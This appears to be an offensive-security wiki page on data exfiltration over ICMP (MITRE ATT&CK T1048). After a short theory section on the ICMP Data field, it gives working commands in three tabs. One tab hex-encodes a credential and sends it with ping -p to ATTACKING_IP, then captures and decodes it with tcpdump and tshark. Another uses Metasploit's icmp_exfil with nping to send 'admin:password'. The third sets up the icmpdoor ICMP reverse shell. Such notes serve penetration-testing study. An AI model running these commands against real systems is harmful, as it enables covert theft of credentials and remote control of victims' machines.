---
description: MITRE ATT&CK™  - Exfiltration Over Alternative Protocol - Technique T1048
---

# Exfiltration over ICMP

## Theory

The Internet Control Message Protocol [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol). It is a network layer protocol used to handle error reporting.

### ICMP Data Section

At a high level, an ICMP packet consists of multiple fields, including a **Data** section. This section can contain arbitrary information, such as diagnostic messages, test payloads, or even copied portions of other network packets (e.g., IPv4 headers for error reporting). The following diagram illustrates the **Data** section, which is **optional** but can be leveraged for various purposes, including covert communication.

Notably, **RFC 792** (which defines ICMP) does not impose any strict requirements on the content of the Data field. This means that **any data can be transmitted**, as long as the overall structure of the ICMP packet remains valid.

<div align="center"><figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure></div>

## Practice

{% tabs %}
{% tab title="Manualy" %}
We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` command.

```bash
root@victime$ echo 'root:p@ssw0rd!' | xxd -p
726f6f743a7040737377307264210a

root@victime$ ping <ATTACKING_IP> -c 1 -p 726f6f743a7040737377307264210a
```

{% hint style="danger" %}
Note that the -p option is only available for **Linux operating systems**. We can confirm that by checking the ping's help manual page.
{% endhint %}

On the attacking machine, we can receive the data as follows

```bash
# Listen for ping and save to pass.pcap
v4resk@kali$ sudo tcpdump icmp -i <INTERFACE> -w pass.pcap

# Extract data field and Hex decode
v4resk@kali$  tshark -r pass.pcap -Y "icmp" -T fields -e data | xxd -r -p
```
{% endtab %}

{% tab title="metasploit" %}
let's set up the Metasploit framework by selecting the `icmp_exfil` module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the `BPF_FILTER` option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows.

```bash
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKING_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP

msf5 auxiliary(server/icmp_exfil) > run
```

On the target, we can now exfiltrate data.

```bash
#First, send the BOF trigger
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "BOFfile.txt"

#Datas
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "admin:password"

#EOF end signal
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "EOF"
```
{% endtab %}

{% tab title="icmpdoor" %}
[ICMPDoor](https://github.com/krabelize/icmpdoor) is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.

On the victime machine:

```bash
victime@target$ sudo icmpdoor -i eth0 -d ATTACKING_IP
```

On the attacking machine:

```bash
veresk@kali$ sudo icmp-cnc -i eth1 -d VICTIME_IP
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.bwlryq.net/posts/icmp_exfiltration/" %}

{% embed url="https://tryhackme.com/room/dataxexfilt/" %}
